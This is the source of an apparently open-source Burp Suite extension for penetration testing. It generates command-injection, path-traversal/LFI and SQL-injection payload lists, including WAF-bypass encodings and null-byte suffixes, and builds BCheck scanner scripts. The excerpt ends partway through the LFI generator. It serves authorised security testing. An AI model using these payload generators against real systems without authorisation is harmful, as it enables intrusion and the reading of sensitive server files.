# -*- coding: utf-8 -*-
"""
Author: Volkan Dindar
        volkan.dindar@owasp.org
        https://github.com/volkandindar/agartha
"""
try:
    import sys, re, urlparse, random, os, urllib, posixpath, json
    from burp import IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory, IBurpExtenderCallbacks, IExtensionHelpers
    from java.awt import BorderLayout, FlowLayout, Color, Font, Dimension, Toolkit
    from javax.swing import JCheckBox, JMenuItem, JTextPane, JTable, GroupLayout, JScrollPane, JProgressBar, SwingConstants, JComboBox, JButton, JTextField, JSplitPane, JPanel, JLabel, JRadioButton, ButtonGroup, JTabbedPane, BoxLayout, JEditorPane, JList, DefaultListModel, DefaultListSelectionModel
    from javax.swing.border import EmptyBorder
    from javax.swing.table import DefaultTableModel, TableCellRenderer
    from java.util import ArrayList, Calendar, Locale
    from java.text import SimpleDateFormat
    from threading import Thread
    from java.awt.datatransfer import StringSelection
    from time import sleep
    from java.net import URL
    from java.lang import Thread as JavaThread
    from java.awt.event import MouseWheelListener, FocusListener
    from javax.swing.text import StyleConstants, StyleContext
except:
    print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"
    sys.exit(1)

VERSION = "3.0"
url_regex = r'(log|sign|time)([-_+%0-9]{0,5})(off|out)|(expire|kill|terminat|delete|remove)'
ext_regex = r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff2|ttf|otf)$'

class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory, IBurpExtenderCallbacks, IExtensionHelpers):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Agartha")
        self._MainTabs = JTabbedPane()
        self._tabDictUI()
        self._tabAuthUI()
        self._tabAuthenticationUI()
        self._tabBambdasUI()
        self._tabHelpUI()
        self._MainTabs.addTab("Payload Generator", None, self._tabDictPanel, None)
        self._MainTabs.addTab("Auth Matrix", None, self._tabAuthSplitpane, None)
        self._MainTabs.addTab("403 Bypass", None, self._tabAuthenticationSplitpane, None)
        self._MainTabs.addTab("Bambdas Generator", None, self._tabBambdasPanel, None)
        self._MainTabs.addTab("Help", None, self._tabHelpJPanel, None)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.issueAlert("The extension has been loaded.")
        print "Agartha(v" + VERSION + ") is a security tool, which specializes in:\n\t\t* Path Traversal and Local File Inclusion (LFI) payload generation\n\t\t* Command Injection and Remote Code Execution (RCE) payload generation\n\t\t* SQL Injection (SQLi) payload generation\n\t\t* BCheck code auto-generated for payload injections, ready to use with the scanning engine\n\t\t* Auth Matrix based on user sessions, to identify authentication and authorization violations\n\t\t* HTTP 403 Bypass to detect both vertical and horizontal privilege escalations\n\t\t* Copy as JavaScript to support deeper XSS exploitation\n\t\t* Bambdas Script Generation to simplify testing scope management and aid in vulnerability discovery\n\nFor more information and tutorial, please visit:\n\t\thttps://github.com/volkandindar/agartha\n\nAuthor:\n\t\tVolkan Dindar\n\t\tvolkan.dindar@owasp.org"
        self.reset(self)
        return

    def reset(self, ev):
        t = Thread(target=self.resetThread, args=[self])
        t.start()
        return

    def resetThread(self, ev):
        sleep(1)
        self.tableMatrixReset(self)
        self.resetAuthentication(self)
        return

    def authMatrixThread(self, ev):
        self._cbAuthColoringFunc(self)
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = " "
        self._tbAuthNewUser.setForeground (Color.black)
        self._btnAuthNewUserAdd.setEnabled(False)
        self._btnAuthRun.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self._tbAuthNewUser.setEnabled(False)
        self._cbSiteMapDepth.setEnabled(False)
        self._btnSiteMapGeneratorRun.setEnabled(False)
        self._tbAuthHeader.setEnabled(False)
        self._tbAuthURL.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self.progressBar.setValue(0)
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self.tableMatrix.clearSelection()
        for x in range(0, self.tableMatrix.getRowCount()):
            for y in range(1, self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt("", x, y)
        
        i = 1000000 / ( self.tableMatrix.getRowCount() * (self.tableMatrix.getColumnCount()-1) )

        for x in range(0, self.tableMatrix.getRowCount()):
            for y in range(1, self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt(self.makeHttpCall(self.tableMatrix.getValueAt(x, 0), self.tableMatrix.getColumnName(y)), x, y)
                self.progressBar.setValue(self.progressBar.getValue() + i)
                self._lblAuthNotification.text = "It is still in progress, '" + str(int(self.progressBar.getValue() / 10000))  + "%' has been completed so far."
        
        self._customRenderer = UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls, "")
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0, self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn(y).setCellRenderer(self._customRenderer)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        if self.userCount < 4:
            self._btnAuthNewUserAdd.setEnabled(True)
            self._tbAuthNewUser.setEnabled(True)
        self._btnAuthRun.setEnabled(True)
        self._cbAuthColoring.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self._cbSiteMapDepth.setEnabled(True)
        self._btnSiteMapGeneratorRun.setEnabled(True)
        self._tbAuthHeader.setEnabled(True)
        self._tbAuthURL.setEnabled(True)
        self.progressBar.setValue(1000000)
        self._lblAuthNotification.text = "Blue, Green, Purple and Beige colors are representation of users. Yellow, Orange and Red cell colors show warning levels."        
        return
    
    def headerAdjustment(self, _header, _url, userID):
        returnMethod = ''
        headerMethod = 'GET'
        header = ""

        if "GET" not in _header[:3]:
            _header = self._helpers.bytesToString(self._callbacks.getHelpers().toggleRequestMethod(_header))
            headerMethod = 'POST'

        histories = self._callbacks.getProxyHistory()[::-1]
        for history in histories:
            url = str(self._helpers.analyzeRequest(history).getUrl())
            if url.startswith("https"):
                url = url.replace(":443/", "/")
            elif url.startswith("http"):
                url = url.replace(":80/", "/")

            if  url == _url:
                if str(self._helpers.analyzeRequest(history.getRequest()).getMethod()) == 'GET':
                    header = str((self._helpers.bytesToString(history.getRequest())).split('\n', 1)[0]).split('\n', 1)[0]
                    returnMethod = 'GET'
                else:
                    header = (self._helpers.bytesToString(self._callbacks.getHelpers().toggleRequestMethod(history.getRequest()))).split('\n', 1)[0]
                    returnMethod = 'POST'
                break
        
        if not returnMethod:
            if headerMethod == 'GET':
                return _header
            else:
                return self._callbacks.getHelpers().toggleRequestMethod(_header)
        elif returnMethod == 'POST':
            _header = _header.replace(_header.split('\n', 1)[0], header)
            return self._callbacks.getHelpers().toggleRequestMethod(_header)
        elif returnMethod == 'GET':
            return _header.replace(_header.split('\n', 1)[0], header)

    def makeHttpCall(self, urlAdd, userID):
        try:
            userID = self.userNames.index(userID)
            header = self.userNamesHttpReq[userID]

            # changing new url path in the request header
            header =  header.replace(str(header.splitlines()[0]), header.splitlines()[0].split(" ", 2)[0] + " /" + urlAdd.split('/',3)[3] + " " + header.splitlines()[0].split(" ", 2)[2])

            # header methods
            if "GET" in header[:3] and self._cbAuthGETPOST.getSelectedIndex() == 1:
                # request was GET and will be in POST
                header = self._callbacks.getHelpers().toggleRequestMethod((header))
            elif "POST" in header[:4] and self._cbAuthGETPOST.getSelectedIndex() == 0:
                # request was POST alike and will be in GET
                header = self._callbacks.getHelpers().toggleRequestMethod((header))
            elif self._cbAuthGETPOST.getSelectedIndex() == 2:
                # request is dynamic, proxy history will be reference
                header = self.headerAdjustment(header, urlAdd, userID)

            portNum = 80
            if urlparse.urlparse(urlAdd).port:
                portNum = urlparse.urlparse(urlAdd).port
            else:
                if urlparse.urlparse(urlAdd).scheme == "https":
                    portNum = 443
    
            _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(urlAdd).hostname, portNum, urlparse.urlparse(urlAdd).scheme), header)
            self.httpReqRes[userID].append(_httpReqRes)
            
            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode()) + " : " + format(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset(), ',d') + " bytes"
        except:
            return str(sys.exc_info()[1])

    def authAdduser(self, ev):
        
        if not self._tbAuthURL.getText().strip():
            self._lblAuthNotification.text = "Please provide minimum one URL!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        if self._tbAuthURL.getText().strip() == self._txtURLDefault:
            self._lblAuthNotification.text = "You can not proceed with default URL, you can right click on any HTTP calls and send it to here."
            self._lblAuthNotification.setForeground (Color.red)
            return

        for _url in self._tbAuthURL.getText().split('\n'):
            if not self.isURLValid(str(_url.strip())):
                self._tbAuthURL.setForeground (Color.red)
                self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _url + "'"
                self._lblAuthNotification.setForeground (Color.red)
                return

            match = re.search(r"^Host:\s*(.+)$", self._tbAuthHeader.getText(), re.MULTILINE)
            url_hostname = urlparse.urlparse(_url.strip()).hostname
            if match and match.group(1):
                header_hostname = match.group(1).strip()
                if header_hostname != url_hostname and url_hostname:
                    self._tbAuthURL.setForeground (Color.red)
                    self._lblAuthNotification.text = "HTTP header and the path hostname do not match, please check: Host: " + header_hostname + " vs " + _url
                    self._lblAuthNotification.setForeground (Color.red)
                    return
            else:
                self._tbAuthURL.setForeground (Color.red)
                self._lblAuthNotification.text = "HTTP header does not have 'Host' element."
                self._lblAuthNotification.setForeground (Color.red)
                return

        _validItem = False
        for _url in self._tbAuthURL.getText().split('\n'):
            if _url.count("/") == 2:
                _url += "/"
            _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
            
            if _url and not any(re.findall(url_regex, _url, re.IGNORECASE)) and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                _validItem = True
                break
        
        if not _validItem:
            self._lblAuthNotification.text = "No item has been added! User URLs may only have possible session terminators (signout, logoff, etc.), dangerous commands (kill, terminate, delete, etc.), or file types (gif, js, etc.)."
            self._btnAuthReset.setEnabled(True)
            return

        self._tbAuthURL.setForeground (Color.black)

        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header, you can right click on any HTTP calls and send it to here."
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthHeader.setForeground (Color.black)

        if self._tbAuthNewUser.text.strip() in self.userNames or not self._tbAuthNewUser.text.strip() or len(self._tbAuthNewUser.text.strip()) > 20:
            self._tbAuthNewUser.setForeground (Color.red)
            self._lblAuthNotification.text = "Please add another user name, that must be unique and less then 20 chars!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthNewUser.setForeground (Color.black)

        if self.userCount == 0:
            # header for unauth user
            unauthHeader = self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
            for line in self._tbAuthHeader.getText().split('\n')[2:]:
                if not any(re.findall(r'(cookie|token|auth)(.*:)', line, re.IGNORECASE)):
                    unauthHeader +=  "\n" + line
                if not line:
                    break
            self.userNamesHttpReq[0] = unauthHeader
        
        self.userCount = self.userCount + 1
        self.userNames.append(self._tbAuthNewUser.text.strip())
        self.userNamesHttpReq.append(self._tbAuthHeader.getText())
        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text.strip())
        self.userNamesHttpUrls.append([])

        urlList = []
        for x in range(0, self.tableMatrix.getRowCount()):
            urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
        for _url in set(self._tbAuthURL.getText().split('\n')):
            _url = _url.strip()
            if _url.count("/") == 2:
                _url += "/"
            _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
            if _url and not any(re.findall(url_regex, _url, re.IGNORECASE)) and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                # ignore logout, signoff, etc. paths
                if _url not in self.userNamesHttpUrls[self.userCount]:
                    # check first if the url exist in user's url list
                    self.userNamesHttpUrls[self.userCount].append(_url)
                    if _url not in urlList:
                        # check table if url exists
                        self.tableMatrix_DM.addRow([_url])
        
        self._tbAuthURL.setText(self._tbAuthURL.getText().split('\n')[0]+"\n")
        self._btnAuthRun.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._lblAuthNotification.text = "'" + self._tbAuthNewUser.text.strip() + "' added successfully! Possible session terminators (signout, logoff, etc.), dangerous commands (kill, terminate, delete, etc.), and file types (gif, js, etc.) have been filtered out!"
        self._lblAuthNotification.setForeground (Color.black)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        self._customRenderer = UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls, "")
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
        
        if self.userCount == 4:
            self._btnAuthNewUserAdd.setEnabled(False)
            self._tbAuthNewUser.setEnabled(False)
        
        return

    def _cbAuthColoringFunc(self, ev):
        global _colorful
        if self._cbAuthColoring.isSelected():
            _colorful = True
        else:
            _colorful = False

        self.tableMatrix.repaint()
        return

    def _cbUnionBasedFunc(self, ev):
        if self._cbUnionBased.isSelected(): 
            self._cbUnionDepth.setEnabled(True)
        else:
            self._cbUnionDepth.setEnabled(False)
        return

    def funcGeneratePayloadForBCheck(self, ev):
        if self.funcGeneratePayload(self):
            line_count = len([line for line in self._tabDictResultDisplay.getText().split('\n') if line.strip()])
            if self._rbDictCommandInj.isSelected():
                bcheckCode= """metadata:
    language: v2-beta
    name: "Command Injection Fuzzing - Agartha"
    description: "Command Injection is a critical vulnerability that allows attackers to execute arbitrary system commands by exploiting insufficiently validated user input. This can result in full system compromise, data theft, or service disruption."
    author: "Agartha"
    tags: "RCE", "Command Injection"

define:
    issueDetail = `Command Injection on Path {latest.request.url}`
    references = `
    References:
    https://portswigger.net/web-security/os-command-injection
    https://owasp.org/www-community/attacks/Command_Injection
    https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html`
    issueRemediation = `Command Injection / Remote Code Execution (RCE): To mitigate these vulnerabilities, all user inputs should be strictly validated and sanitized to block malicious characters or patterns. Employing parameterized queries ensures that inputs are handled as data, not executable code. Running applications with the least privileges limits the impact of successful exploits, while proper error handling and avoiding detailed error messages prevent information disclosure. Regular code reviews and security testing are essential to detect and address issues early, significantly reducing the risk of RCE attacks.
     {references}`

run for each:
    payloads=
"""
            elif self._rbDictLFI.isSelected():
                bcheckCode= """metadata:
    language: v2-beta
    name: "File Injection Fuzzing - Agartha"
    description: "Local File Inclusion (LFI) occurs when an application improperly validates user input, enabling attackers to include and execute local files on the server. This often exposes sensitive information and can lead to remote code execution under certain conditions."
    author: "Agartha"
    tags: "LFI", "Directory Traversal"

define:
    issueDetail = `Local File Inclusion on Path {latest.request.url}`
    references = `
    References:
    https://portswigger.net/web-security/file-path-traversal
    https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion`
    issueRemediation = `Local File Inclusion (LFI) / Directory Traversal: Preventing LFI and Directory Traversal requires rigorous input validation and restricting inputs to expected, whitelisted paths. Implementing an allowlist of authorized files and directories ensures only safe resources are accessible. Applications should be executed with minimal privileges to reduce the potential impact of exploitation. Secure error handling, coupled with avoiding verbose error messages, makes it harder for attackers to gather intelligence. Ongoing code reviews and penetration testing help identify and remediate such vulnerabilities before they can be abused.
     {references}`

run for each:
    payloads=
"""
            elif self._rbDictSQLi.isSelected():
                bcheckCode= """metadata:
    language: v2-beta
    name: "SQL Injection Fuzzing - Agartha"
    description: "SQL Injection (SQLi) is a serious flaw where malicious SQL code is inserted into a query, allowing attackers to manipulate database operations, bypass authentication, or exfiltrate sensitive data."
    author: "Agartha"
    tags: "SQLi", "SQL Injection"

define:
    issueDetail = `SQL Injection on Path {latest.request.url}`
    references = `
    References:
    https://portswigger.net/web-security/sql-injection
    https://owasp.org/www-community/attacks/SQL_Injection
    https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html`
    issueRemediation = `SQL Injection (SQLi) vulnerabilities can be mitigated by consistently using parameterized queries or prepared statements, ensuring that user inputs cannot alter SQL commands. Where appropriate, stored procedures can further encapsulate SQL logic and minimize direct interaction with the database. Input validation and sanitization add an additional layer of defense, while secure error handling reduces the risk of leaking database structure details. Regular security audits and code reviews are vital to uncover weak points early. By embedding these practices into the development lifecycle, organizations can greatly reduce the risk of SQL injection attacks.
     {references}`

run for each:
    payloads=
"""
            text = self._tabDictResultDisplay.getText()
            lines = text.split('\n')
            formatted_lines = ['\t"{}"'.format(line.replace('"', '\\"')) + ',' for line in lines if line.strip()]
            bcheckCode += '\n'.join(formatted_lines)
            bcheckCode = bcheckCode[:-1] + "\n"

            if self._rbDictSQLi.isSelected() or self._rbDictCommandInj.isSelected():
                bcheckCode += """
given any insertion point then
    send payload called payloadReplacing:
        replacing: {payloads}
    send payload called payloadAppending:
        appending: {payloads}

    if {payloadReplacing.response.status_code} is "200" then
      # To improve detection accuracy, consider creating specific conditions.
      # if ("condition1" in {payloadReplacing.response.body} and "condition2" in {payloadReplacing.response.body}) or ("condition3" in {payloadReplacing.response.body} and "condition4" in {payloadReplacing.response.body}) then
        report issue and continue:
            severity: medium
            confidence: tentative
            detail: `Injected parameter: {payloads}, at {payloadReplacing.request.url.path}`
            remediation: {issueRemediation}
      # end if
    end if

    if {payloadAppending.response.status_code} is "200" then
      # To improve detection accuracy, consider creating specific conditions.
      # if ("condition1" in {payloadAppending.response.body} and "condition2" in {payloadAppending.response.body}) or ("condition3" in {payloadAppending.response.body} and "condition4" in {payloadAppending.response.body}) then
        report issue and continue:
            severity: medium
            confidence: tentative
            detail: `Injected parameter: {payloads}, at {payloadAppending.request.url.path}`
            remediation: {issueRemediation}
      # end if
    end if
"""
            elif self._rbDictLFI:
                bcheckCode += """
given request then
    send request called payloadReplacingPartially:
        replacing path: `{regex_replace({regex_replace({base.request.url}, "^.*?\\/.*?\\/.*?\\/", "/")}, "([^/]+)$", "")}{payloads}`
    if {payloadReplacingPartially.response.status_code} is "200" then
        # To improve detection accuracy, consider creating specific conditions.
        # if ("localhost" in {payloadReplacingPartially.response.body} and "127.0.0.1" in {payloadReplacingPartially.response.body}) or ("localhost" in {payloadReplacingPartially.response.body} and "127.0.0.1" in {payloadReplacingPartially.response.body}) then
            report issue and continue:
            severity: medium
            confidence: tentative
            detail: `Injected parameter: {payloads}, at {payloadReplacingPartially.request.url.path}`
            remediation: {issueRemediation}
        # end if
    end if

    if ({base.request.url.file} matches ".*[?].*[=].*") then
        send request called payloadReplacingQueryString:
            replacing queries: `{regex_replace({base.request.url.query}, "([^&=]+)=([^&]*)", "$1=")}{payloads}`
        if {payloadReplacingQueryString.response.status_code} is "200" then
            # To improve detection accuracy, consider creating specific conditions.
            # if ("localhost" in {payloadReplacingQueryString.response.body} and "127.0.0.1" in {payloadReplacingQueryString.response.body}) or ("localhost" in {payloadReplacingQueryString.response.body} and "127.0.0.1" in {payloadReplacingQueryString.response.body}) then
                report issue and continue:
                severity: medium
                confidence: tentative
                detail: `Injected parameter: {payloads}, at {payloadReplacingQueryString.request.url.path}`
                remediation: {issueRemediation}
            # end if
        end if
    end if
"""
            self.updateBambdasScriptText(bcheckCode)
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            clipboard.setContents(StringSelection(self._tabDictResultDisplay.getText()), None)
            self._lblStatusLabel.setText('BCheck Code has generated with ' + str(line_count) + ' payloads, and has been copied to your clipboard!')
            if line_count > 3000:
                self._lblStatusLabel.setText(self._lblStatusLabel.getText() + " Large Bambdas scripts may cause performance issues.")
        
        return

    def funcGeneratePayload(self, ev):
        self._lblStatusLabel.setForeground (Color.red)
        self._tabDictResultDisplay.setText("")
        if self._rbDictSQLi.isSelected():            
            self._txtTargetPath.setText(self._txtDefaultSQLi)
        elif not self.isValid():
            if self._rbDictLFI.isSelected():
                self._lblStatusLabel.setText("File input is not valid. "+ self._txtDefaultLFI)
                self._txtTargetPath.setText(random.choice(["/etc/hosts", "C:\\windows\\system32\\drivers\\etc\\hosts"]))
            elif self._rbDictCommandInj.isSelected():
                self._lblStatusLabel.setText("Command input is not valid. " + self._txtDefaultCommandInj)
                self._txtTargetPath.setText(random.choice(["sleep 120", "timeout 120"]))
            return False

        self._lblStatusLabel.setForeground (Color.black)
        self._txtTargetPath.text = self._txtTargetPath.text.strip()
        self._lblStatusLabel.setText("")
        if self._rbDictCommandInj.isSelected():
            self.funcCommandInj(self)
        if self._rbDictLFI.isSelected():
            self.funcLFI(self)
        if self._rbDictSQLi.isSelected():
            self.funcSQLi(self)
        return True
       
    def isValid(self):
        # input should not be empty, should contain at least one alphanumeric char and less than 250 length
        if self._txtTargetPath.text.strip() and re.compile("[0-9a-zA-Z]").findall(self._txtTargetPath.text) and self._txtTargetPath.text.strip() !=self._txtDefaultLFI and self._txtTargetPath.text.strip() !=self._txtDefaultCommandInj and len(self._txtTargetPath.text.strip()) < 250:
            return True
        else:
            return False

    def funcRBSelection(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        self._lblStatusLabel.setText("")
        self._tabDictPanel_LFI.setVisible(False)
        self._cbDictCommandInjOpt.setVisible(False)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLi.setVisible(False)
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictResultDisplay.setText("")
        if self._rbDictLFI.isSelected():
            self._txtTargetPath.setText(self._txtDefaultLFI)
            self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
            self._tabDictPanel_LFI.setVisible(True)
            self._lblStatusLabel.setText("Please provide a path to generate payloads!")
        elif self._rbDictCommandInj.isSelected():
            self._txtTargetPath.setText(self._txtDefaultCommandInj)
            self._tabDictResultDisplay.setText(self._txtCheatSheetCommandInj)
            self._cbDictCommandInjOpt.setVisible(True)
            self._lblStatusLabel.setText("Please provide a command to generate payloads!")
        elif self._rbDictSQLi.isSelected():
            self._txtTargetPath.setText(self._txtDefaultSQLi)
            self._tabDictPanel_SQLType.setVisible(True)
            self._tabDictPanel_SQLi.setVisible(True)
            self._tabDictPanel_SQLOptions.setVisible(True)
            self.funcSQLi(self)
        return

    def funcCommandInj(self, ev):
        listCommandInj = []        
        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
        escapeChars = ["",  "'", "\\'", "\\\\'", "\"", "\\\"", "\\\\\""]
        separators = ["&", "&&", "|", "||", ";"]
        
        for prefix in prefixes:
            for escapeChar in escapeChars:
                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                        continue
                for separator in separators:
                    listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + escapeChar + "\n")
                listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")
                listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")
            listCommandInj.append(prefix + self._txtTargetPath.text + "\n")
            listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + "\n")

        listCommandInj = list(set(listCommandInj))
        listCommandInj.sort(reverse=True)
        
        if self._cbDictCommandInjEncoding.isSelected():
            listCommandInj = self.encodeURL(listCommandInj)
        
        self._tabDictResultDisplay.setText(''.join(map(str, listCommandInj)))
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(self._tabDictResultDisplay.getText()), None)
        self._lblStatusLabel.setText('Payload list for "' + self._txtTargetPath.text + '" command returns with '+ str(len(listCommandInj)) + ' result, and they have been copied to your clipboard!')
        return

    def funcLFI(self, ev):
        listLFI = []
        dept = int(self._cbDictDepth.getSelectedItem())
        
        if self._txtTargetPath.text.startswith('/') or self._txtTargetPath.text.startswith('\\'):
            self._txtTargetPath.text = self._txtTargetPath.text[1:]
        
        filePath = self._txtTargetPath.text.replace("\\","/")
        
        counter = 0
        if self._cbDictEquality.isSelected():
            counter = dept

        while counter <= dept:
            _upperDirectory = ""
            i = 1
            while i <= counter:
                _upperDirectory += "../"
                i = i + 1
                listLFI.append(_upperDirectory + filePath + "\n")

            if self._cbDictWafBypass.isSelected():
                suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                for suffix in suffixes:
                    listLFI.append((_upperDirectory + filePath).replace("..", "...") + suffix + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("..", "....") + suffix + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("..", "..;") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "...") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "....") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "..;") + suffix + "\n")

                prefixes = ["/", "\\", "/..;/", "..;/", ".//"]
                for prefix in prefixes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(prefix + _upperDirectory + filePath + suffix + "\n")
                        if not "\\" in prefix and not "/..;/" in prefix :
                            listLFI.append(_upperDirectory + prefix + filePath + suffix + "\n")


                if "\\" in self._txtTargetPath.text:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("/", "\\") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "...") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "....") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\\\") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\\\") + suffix + "\n")
                        listLFI.append(_upperDirectory + self._txtTargetPath.text.replace("/", "\\\\") + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\") + suffix + "\n")

                _slashes = ["..././", "...\\.\\"]
                for _slash in _slashes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("../", _slash) + filePath + suffix + "\n")

                _slashes = ["\\", "\\\\", "\\\\\\", "//", "///", "\\/"]
                for _slash in _slashes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("/", _slash) + filePath + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", _slash) + self._txtTargetPath.text + suffix + "\n")                    
                        if "\\" in self._txtTargetPath.text:
                            listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "\\" + self._txtTargetPath.text + suffix + "\n")
                        else:
                            listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "/" + filePath + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slash) + suffix + "\n")


                _slashes = ["%2f", "%5c"   , "%252f"     , "%255c"     , "%c1%9c"      , "%c0%af"]
                _dots = ["%2e%2e", "%2e%2e", "%252e%252e", "%252e%252e", "%c0%2e%c0%2e", "%c0%2e%c0%2e"]
                suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]

                for i in range(len(_slashes)):
                    if _slashes[i].startswith("%c") or _slashes[i].startswith("%25"):
                        listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + "\n")
                        listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + "\n")
                        listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + "\n")
                        listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + "\n")                    
                        listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + "\n")
                    else:
                        for suffix in suffixes:
                            listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + suffix + "\n")
